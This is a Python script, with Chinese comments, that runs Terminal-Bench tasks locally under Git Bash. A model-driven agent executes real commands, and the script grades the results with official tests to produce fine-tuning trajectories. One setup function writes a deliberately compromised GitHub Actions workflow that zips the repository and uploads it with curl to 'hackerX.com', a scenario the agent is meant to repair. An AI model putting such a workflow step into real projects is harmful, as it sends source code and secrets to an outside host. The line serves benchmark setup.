#!/usr/bin/env python3
"""
Windows 本地彩排：没有 Docker / WSL 可用时，用 Git Bash 当真实终端，
跑真实的 CodebuffApiAgent（真实 freebuff2api 模型调用 + 真实命令执行），
并用官方 task 测试（仅把绝对路径 /app 映射到工作区）判分。

输出布局与 `tb run` 完全一致，可直接喂给 learning/build_sft_dataset.py：

    <out-root>/<run_id>/<task_id>/
        results.json                 # task_id/instruction/is_resolved/failure_mode/...
        agent-logs/trajectory.jsonl  # CodebuffApiAgent 记录的逐步轨迹

用法：
    python scripts/local_rehearsal.py \
        --data-dir datasets/terminal-bench-core-0.1.1 \
        --tasks hello-world,heterogeneous-dates \
        --run-id rehearsal_1 \
        --out-root results \
        --max-steps 12
    # 模型参数走环境变量（与 config.env 一致）：
    #   SFT_API_BASE_URL / SFT_API_KEY / SFT_MODEL

说明：这是 M4 上正式 gen_sft.sh 的忠实彩排——数据是真实的（真实模型、真实命令、
真实终端输出），唯一差异是沙箱从 Docker 容器换成了 Git Bash（Windows 本地），
以及测试里 /app 绝对路径被映射到任务工作区。M4 上跑正式版请用 gen_sft.sh。
"""

from __future__ import annotations

import argparse
import json
import os
import re
import shutil
import subprocess
import sys
import time
from pathlib import Path

import yaml

# 保证能 import 到 tb_loop.agents.codebuff_api_agent
TB_LOOP_DIR = Path(__file__).resolve().parents[1]
for p in (TB_LOOP_DIR, TB_LOOP_DIR.parent):
    if str(p) not in sys.path:
        sys.path.insert(0, str(p))

from tb_loop.agents.codebuff_api_agent import CodebuffApiAgent  # noqa: E402

COMMAND_TIMEOUT = 120  # 单条命令超时（秒）


# ---------------------------------------------------------------------------
# 真实终端后端：Git Bash（保留命令间的工作区 + 累积 transcript）
# ---------------------------------------------------------------------------
class BashSession:
    """模拟 tb 的 TmuxSession 最小接口，后端是真实 bash 子进程。"""

    def __init__(self, workspace: Path, extra_path: Path | None = None):
        self.workspace = workspace
        self._transcript: list[str] = []
        self._bash = shutil.which("bash")
        if not self._bash:
            raise RuntimeError("bash not found on PATH (run from Git Bash)")
        # Git Bash 需要 POSIX 路径（/d/...），cygpath 转换一次缓存
        try:
            self._posix_ws = subprocess.run(
                ["cygpath", "-u", str(workspace.resolve())],
                capture_output=True, text=True, timeout=10,
            ).stdout.strip()
        except Exception:
            self._posix_ws = str(workspace.resolve())
        if not self._posix_ws:
            self._posix_ws = str(workspace.resolve())
        if extra_path is not None:
            try:
                self._posix_extra = subprocess.run(
                    ["cygpath", "-u", str(extra_path.resolve())],
                    capture_output=True, text=True, timeout=10,
                ).stdout.strip()
            except Exception:
                self._posix_extra = str(extra_path.resolve())
        else:
            self._posix_extra = None

    def capture_pane(self) -> str:
        return "\n".join(self._transcript)

    def send_keys(self, keys: list[str], block: bool = True) -> None:
        for key in keys:
            if key == "Enter":
                continue
            self._run(key)

    def _run(self, cmd: str) -> None:
        cmd = cmd.strip()
        if not cmd:
            return
        path_prefix = f'export PATH="{self._posix_extra}:$PATH"; ' if self._posix_extra else ""
        script = f'{path_prefix}cd "{self._posix_ws}" && {{ {cmd}\n }}'
        try:
            proc = subprocess.run(
                [self._bash, "-lc", script],
                capture_output=True,
                text=True,
                encoding="utf-8",
                errors="replace",
                timeout=COMMAND_TIMEOUT,
            )
            out = (proc.stdout or "").rstrip()
            err = (proc.stderr or "").rstrip()
        except subprocess.TimeoutExpired:
            out, err = "", f"<command timed out after {COMMAND_TIMEOUT}s>"
        self._transcript.append(f"$ {cmd}\n{out}{chr(10) + err if err else ''}")
        # 记录退出码，方便轨迹里看到失败信号
        if "timeout" in err:
            self._transcript.append(f"# exit: timeout")

    # 供结果元数据用
    @property
    def transcript_size(self) -> int:
        return sum(len(t) for t in self._transcript)


# ---------------------------------------------------------------------------
# 任务加载
# ---------------------------------------------------------------------------
def load_task(data_dir: Path, task_id: str, rewrite_app: bool = False) -> dict:
    task_dir = data_dir / "tasks" / task_id
    yaml_path = task_dir / "task.yaml"
    if not yaml_path.exists():
        raise FileNotFoundError(f"task not found: {task_dir}")
    cfg = yaml.safe_load(yaml_path.read_text(encoding="utf-8"))
    descs = cfg.get("descriptions") or []
    prompt = ""
    for d in descs:
        if d.get("key") == "base" or prompt == "":
            prompt = (d.get("description") or "").strip()
            break
    if rewrite_app:
        # Docker 环境里任务工作目录是 /app，Git Bash 彩排映射为当前工作区。
        # 把 prompt 里的 /app/xxx 改成 ./xxx、独立 /app 改成 .，避免 agent 尝试 cd /app。
        import re as _re
        prompt = _re.sub(r"/app/([^\s'\"]*)", r"./\1", prompt)
        prompt = _re.sub(r"(?<![/\w])/app(?![/\w])", ".", prompt)
    return {
        "id": task_id,
        "prompt": prompt,
        "category": cfg.get("category", ""),
        "difficulty": cfg.get("difficulty", ""),
        "task_dir": task_dir,
        "_had_app": "/app" in (descs[0].get("description") or "") if descs else False,
    }


def prepare_workspace(task: dict, workspace: Path) -> None:
    """复刻 Dockerfile 的 COPY：task-deps/ 递归 + 顶层散文件进工作区。"""
    task_dir = task["task_dir"]
    workspace.mkdir(parents=True, exist_ok=True)
    deps = task_dir / "task-deps"
    if deps.exists():
        for item in deps.iterdir():
            dst = workspace / item.name
            if item.is_dir():
                shutil.copytree(item, dst, dirs_exist_ok=True)
            else:
                shutil.copy2(item, dst)
    for item in sorted(task_dir.iterdir()):
        if item.name in {
            "Dockerfile",
            "task.yaml",
            "solution.sh",
            "solution.yaml",
            "run-tests.sh",
            "docker-compose.yaml",
            "tests",
            "task-deps",
        }:
            continue
        dst = workspace / item.name
        if item.is_dir():
            shutil.copytree(item, dst, dirs_exist_ok=True)
        else:
            shutil.copy2(item, dst)


# 复刻 Dockerfile 里除 COPY 外的关键布局（仅影响个别任务的输入摆放，不改任务逻辑）
def _patch_new_encrypt(workspace: Path, venv_python: Path) -> None:
    """Dockerfile: mkdir data && mv sample*.txt data/；rencrypt 需在 PATH 上。"""
    data_dir = workspace / "data"
    data_dir.mkdir(exist_ok=True)
    for f in ("sample1.txt", "sample2.txt"):
        src = workspace / f
        if src.exists():
            src.replace(data_dir / f)
    # rencrypt 命令垫片（指向工作区里的 rencrypt.py，走 .bin 的 venv python）
    wrapper = workspace / ".bin" / "rencrypt"
    wrapper.write_bytes(b'#!/bin/bash\nexec python "$(pwd)/rencrypt.py" "$@"\n')
    wrapper.chmod(0o755)


def _patch_chess(workspace: Path, venv_python: Path) -> None:
    """Dockerfile: COPY make.py /app && python3 make.py && rm make.py
    ——生成棋盘 PNG 后把 make.py 删掉（agent 不应看到生成脚本）。"""
    make_py = workspace / "make.py"
    if make_py.exists():
        subprocess.run(
            [str(venv_python), str(make_py)],
            cwd=str(workspace),
            capture_output=True,
            timeout=120,
        )
        make_py.unlink(missing_ok=True)


def _patch_recover_obfuscated(workspace: Path, venv_python: Path) -> None:
    """Dockerfile: COPY setup_files -> /app/sensitive_data/。"""
    src = workspace / "setup_files"
    if src.is_dir():
        dst = workspace / "sensitive_data"
        dst.mkdir(exist_ok=True)
        for f in src.iterdir():
            (dst / f.name).write_bytes(f.read_bytes())
        shutil.rmtree(src, ignore_errors=True)


def _patch_git_workflow_hack(workspace: Path, venv_python: Path) -> None:
    """setup.sh: mkdir my_website/.github/workflows + cat deploy.yml（含 token 泄漏，
    agent 的任务是修复它）+ info.md 里的 CV 内容。"""
    import subprocess as _sp
    deploy = workspace / "my_website" / ".github" / "workflows" / "deploy.yml"
    deploy.parent.mkdir(parents=True, exist_ok=True)
    deploy.write_text(
        """name: Deploy Site
on:
  push:
    branches:
      - main
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - name: Check out repository
        uses: actions/checkout@v3
      - name: Archive entire repo
        run: zip -r repo.zip .
      - name: Backup
        run: |
          curl -X POST -F "file=@repo.zip" https://hackerX.com/upload
      - name: Set up Node.js
        uses: actions/setup-node@v3
""",
        encoding="utf-8",
    )
    info_md = workspace / "my_website" / "info.md"
    src_info = workspace / "info.md"
    if src_info.exists():
        info_md.write_text(src_info.read_text(encoding="utf-8"), encoding="utf-8")
        src_info.unlink(missing_ok=True)


TASK_LAYOUT_PATCHES: dict[str, callable] = {
    "new-encrypt-command": _patch_new_encrypt,
    "chess-best-move": _patch_chess,
    "recover-obfuscated-files": _patch_recover_obfuscated,
    "git-workflow-hack": _patch_git_workflow_hack,
}


def make_shims(workspace: Path, venv_python: Path) -> Path:
    """建 <ws>/.bin 垫片目录：python/python3 指向 venv python（Windows 的
    python3 是坏的 WindowsApps 桩）。该目录会以最高优先级进 agent 的 PATH。"""
    bin_dir = workspace / ".bin"
    bin_dir.mkdir(parents=True, exist_ok=True)
    py = str(Path(venv_python).resolve())
    for name in ("python", "python3"):
        shim = bin_dir / name
        shim.write_bytes(f'#!/bin/bash\nexec "{py}" "$@"\n'.encode("utf-8"))
        shim.chmod(0o755)
    return bin_dir


# ---------------------------------------------------------------------------
# 判分：官方测试（/app 绝对路径映射到工作区）
# ---------------------------------------------------------------------------
# 平台不适用任务：chmod/权限语义在 Windows（NTFS 无真实执行位）上无法判分，
# 标记为 SKIP 而不是 FAIL（agent 行为可能正确，但 Windows 判分器看不到执行位）
PLATFORM_INAPPLICABLE = {"fix-permissions", "processing-pipeline"}


def evaluate(task: dict, workspace: Path, venv_python: Path) -> dict:
    """跑官方 pytest（拷贝后把 /app 映射成工作区路径），返回 {passed, output}。"""
    if task["id"] in PLATFORM_INAPPLICABLE:
        return {"passed": False, "output": "<SKIP: chmod 语义在 Windows 上无法判分>", "skipped": True}
    src_tests = task["task_dir"] / "tests"
    eval_dir = workspace / "_eval"
    eval_dir.mkdir(parents=True, exist_ok=True)
    ws_abs = workspace.resolve().as_posix()
    copied = []
    for tf in sorted(src_tests.glob("*.py")):
        text = tf.read_text(encoding="utf-8")
        # 仅做路径映射，断言逻辑原样保留
        text = re.sub(r'"/app', f'"{ws_abs}', text)
        text = re.sub(r"'/app", f"'{ws_abs}", text)
        dst = eval_dir / tf.name
        dst.write_text(text, encoding="utf-8")
        copied.append(dst.name)

    try:
        # tb 会通过 TEST_DIR 环境变量把容器内测试目录传给测试（如 fix-pandas-version
        # 用它定位 src/），彩排里映射为本地 _eval 目录
        env = dict(os.environ)
        env["TEST_DIR"] = eval_dir.resolve().as_posix()
        proc = subprocess.run(
            [
                str(venv_python),
                "-m",
                "pytest",
                "-q",
                *[(eval_dir / c).resolve().as_posix() for c in copied],
            ],
            cwd=str(workspace),
            capture_output=True,
            text=True,
            encoding="utf-8",
            errors="replace",
            timeout=120,
            env=env,
        )
        passed = proc.returncode == 0
        tail = (proc.stdout or "").strip().splitlines()
        tail = tail[-8:] if tail else []
        return {"passed": passed, "output": "\n".join(tail)}
    except subprocess.TimeoutExpired:
        return {"passed": False, "output": "<pytest timed out>"}


# ---------------------------------------------------------------------------
# 主流程
# ---------------------------------------------------------------------------
def main() -> int:
    ap = argparse.ArgumentParser(description="Windows Git Bash 本地彩排（真实轨迹生成）")
    ap.add_argument("--data-dir", type=Path, required=True, help="数据集目录（含 tasks/）")
    ap.add_argument("--tasks", required=True, help="逗号分隔的 task-id 列表")
    ap.add_argument("--run-id", default="rehearsal_1")
    ap.add_argument("--out-root", type=Path, default=Path("results"))
    ap.add_argument("--max-steps", type=int, default=12)
    ap.add_argument("--venv-python", type=Path, default=None, help="判分用 venv python（需 pytest/numpy）")
    ap.add_argument("--rewrite-app", action="store_true", help="把 prompt 里的 /app/xxx 重写成 ./xxx（Git Bash 无 /app 挂载）")
    args = ap.parse_args()

    base_url = os.environ.get("SFT_API_BASE_URL", "http://127.0.0.1:8000/v1")
    api_key = os.environ.get("SFT_API_KEY", "sk-local")
    model = os.environ.get("SFT_MODEL", "deepseek/deepseek-v4-flash")
    venv_python = args.venv_python or Path(sys.executable)

    run_dir = args.out_root / args.run_id
    run_dir.mkdir(parents=True, exist_ok=True)

    task_ids = [t.strip() for t in args.tasks.split(",") if t.strip()]
    print(f"== 彩排开始: {len(task_ids)} tasks, model={model}, base={base_url}")
    print(f"   数据集: {args.data_dir.resolve()}")
    print(f"   输出:   {run_dir.resolve()}")
    print()

    summary = []
    for task_id in task_ids:
        t0 = time.time()
        workspace = run_dir / task_id / "workspace"
        logging_dir = run_dir / task_id / "agent-logs"
        try:
            task = load_task(args.data_dir, task_id, rewrite_app=args.rewrite_app)
            prepare_workspace(task, workspace)
            bin_dir = make_shims(workspace, venv_python)
            patch = TASK_LAYOUT_PATCHES.get(task_id)
            if patch:
                patch(workspace, venv_python)
            print(f"--- [{task_id}] ({task['difficulty']}/{task['category']}) ---")
            print(f"    prompt: {task['prompt'][:100]}...")

            agent = CodebuffApiAgent(
                model_name=model,
                api_key=api_key,
                base_url=base_url,
                max_steps=args.max_steps,
            )
            session = BashSession(workspace, extra_path=bin_dir)
            result = agent.perform_task(task["prompt"], session, logging_dir)

            # 读回轨迹统计
            traj_path = logging_dir / "trajectory.jsonl"
            n_steps = 0
            if traj_path.exists():
                n_steps = sum(
                    1 for ln in traj_path.read_text(encoding="utf-8").splitlines() if ln.strip()
                )

            ev = evaluate(task, workspace, venv_python)
            is_resolved = bool(ev["passed"])
            skipped = bool(ev.get("skipped"))

            results = {
                "task_id": task_id,
                "instruction": task["prompt"],
                "category": task["category"],
                "difficulty": task["difficulty"],
                "is_resolved": is_resolved,
                "failure_mode": "none" if is_resolved else ("platform_inapplicable" if skipped else "test_failed"),
                "n_steps": n_steps,
                "total_input_tokens": result.total_input_tokens,
                "total_output_tokens": result.total_output_tokens,
                "duration_sec": round(time.time() - t0, 1),
                "test_output": ev["output"],
                "sandbox": "git-bash-rehearsal",
            }
            (run_dir / task_id / "results.json").write_text(
                json.dumps(results, ensure_ascii=False, indent=2), encoding="utf-8"
            )
            status = "PASS" if is_resolved else "FAIL"
            print(f"    -> {status}  steps={n_steps}  in_tok={result.total_input_tokens} "
                  f"out_tok={result.total_output_tokens}  {time.time()-t0:.0f}s")
            if not is_resolved:
                print(f"       test: {ev['output']}")
            summary.append(results)
        except Exception as e:  # noqa: BLE001 —— 单个任务失败不中断整批
            print(f"    -> ERROR: {e}")
            (run_dir / task_id / "results.json").write_text(
                json.dumps(
                    {"task_id": task_id, "instruction": task.get("prompt", ""),
                     "is_resolved": False, "failure_mode": f"runner_error: {e}",
                     "n_steps": 0},
                    ensure_ascii=False,
                    indent=2,
                ),
                encoding="utf-8",
            )

    print()
    print("== 汇总 ==")
    n_pass = sum(1 for s in summary if s["is_resolved"])
    for s in summary:
        print(f"  {s['task_id']:<28} {'PASS' if s['is_resolved'] else 'FAIL':<5} "
              f"steps={s['n_steps']:<3} in={s['total_input_tokens']:<7} out={s['total_output_tokens']}")
    print(f"resolved: {n_pass}/{len(summary)}  -> 数据集: python learning/build_sft_dataset.py {run_dir}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
